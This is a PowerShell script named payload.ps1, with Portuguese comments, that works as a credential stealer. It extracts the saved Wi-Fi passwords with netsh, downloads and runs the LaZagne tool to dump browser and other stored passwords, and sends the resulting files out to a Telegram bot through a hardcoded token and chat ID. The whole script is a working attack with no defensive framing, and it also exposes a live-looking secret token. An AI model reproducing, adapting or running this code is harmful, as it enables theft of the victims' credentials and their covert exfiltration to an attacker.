# Iniciar log para depuração
$logFile = "$env:TEMP\payload_log.txt"
Start-Transcript -Path $logFile -Append
Write-Output "=== Iniciando payload.ps1 em $(Get-Date) ==="

# Coletar senhas Wi-Fi
Write-Output "Coletando senhas Wi-Fi..."
$wifiOutput = ""
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}
if (-not $profiles) {
    Write-Output "Nenhum perfil Wi-Fi encontrado."
}
foreach ($profile in $profiles) {
    Write-Output "Processando perfil: $profile"
    $result = netsh wlan show profile name="$profile" key=clear
    $keyLine = ($result | Select-String "Key Content")
    $pass = if ($keyLine) { ($keyLine -split ":")[1].Trim() } else { "Sem senha encontrada" }
    $wifiOutput += "`n$profile : $pass"
}
$wifiFile = "$env:TEMP\wifi.txt"
Write-Output "Salvando senhas Wi-Fi em $wifiFile"
$wifiOutput | Out-File $wifiFile -Encoding UTF8
if (Test-Path $wifiFile) {
    Write-Output "Arquivo $wifiFile criado com sucesso. Tamanho: $((Get-Item $wifiFile).Length) bytes"
} else {
    Write-Output "Erro: Falha ao criar $wifiFile."
}

# Baixar LaZagne
Write-Output "Baixando LaZagne..."
$laZagneURL = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe"
$laZagnePath = "$env:TEMP\lazagne.exe"
try {
    Invoke-WebRequest -Uri $laZagneURL -OutFile $laZagnePath -UseBasicParsing -ErrorAction Stop
    Write-Output "LaZagne baixado com sucesso em $laZagnePath."
} catch {
    Write-Output "Erro ao baixar LaZagne: $_"
}

# Executar LaZagne e salvar output
$browserFile = "$env:TEMP\browser.txt"
if (Test-Path $laZagnePath) {
    Write-Output "Executando LaZagne..."
    Start-Process -FilePath $laZagnePath -ArgumentList "all" -NoNewWindow -Wait -RedirectStandardOutput $browserFile
    Start-Sleep -Seconds 3
    if (Test-Path $browserFile) {
        Write-Output "Arquivo $browserFile criado com sucesso. Tamanho: $((Get-Item $browserFile).Length) bytes"
    } else {
        Write-Output "Erro: Falha ao criar $browserFile."
    }
} else {
    Write-Output "Erro: LaZagne não encontrado em $laZagnePath."
}

# Função para enviar arquivos para o Telegram
function Send-TelegramFile {
    param (
        [string]$Token,
        [string]$ChatId,
        [string]$FilePath
    )
    Write-Output "Enviando arquivo $FilePath..."
    if (-not (Test-Path $FilePath)) {
        Write-Output "Erro: Arquivo $FilePath não encontrado."
        return
    }
    if ((Get-Item $FilePath).Length -eq 0) {
        Write-Output "Erro: Arquivo $FilePath está vazio."
        return
    }
    $uri = "https://api.telegram.org/bot$Token/sendDocument"
    try {
        $httpClient = New-Object System.Net.Http.HttpClient
        $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
        $multipartContent.Add((New-Object System.Net.Http.StringContent($ChatId)), "chat_id")
        $fileStream = [System.IO.File]::OpenRead($FilePath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $fileContent.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        $multipartContent.Add($fileContent, "document", $fileName)
        $response = $httpClient.PostAsync($uri, $multipartContent).Result
        $response.EnsureSuccessStatusCode()
        $responseContent = $response.Content.ReadAsStringAsync().Result
        Write-Output "Arquivo $fileName enviado com sucesso. Resposta: $responseContent"
        $fileStream.Close()
        $httpClient.Dispose()
    } catch {
        Write-Output "Erro ao enviar $fileName : $_"
    }
}

# Testar conectividade com a API do Telegram
Write-Output "Testando conectividade com api.telegram.org..."
try {
    $testResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot7875549832:AAGBdj5P0_WZwA2CTzwsl5BxmMsEBK-A-zw/getMe" -ErrorAction Stop
    Write-Output "Conexão com API do Telegram bem-sucedida. Bot: $($testResponse.result.username)"
} catch {
    Write-Output "Erro ao conectar à API do Telegram: $_"
}

# Enviar arquivos para o Telegram
$token = "7875549832:AAGBdj5P0_WZwA2CTzwsl5BxmMsEBK-A-zw"
$chatid = "5400490425"
Write-Output "Enviando arquivos para o Telegram (Token: $token, ChatID: $chatid)"
Send-TelegramFile -Token $token -ChatId $chatid -FilePath $wifiFile
Start-Sleep -Seconds 2  # Pequena pausa para evitar limites de taxa
Send-TelegramFile -Token $token -ChatId $chatid -FilePath $browserFile

Write-Output "=== Finalizando payload.ps1 em $(Get-Date) ==="
Stop-Transcript
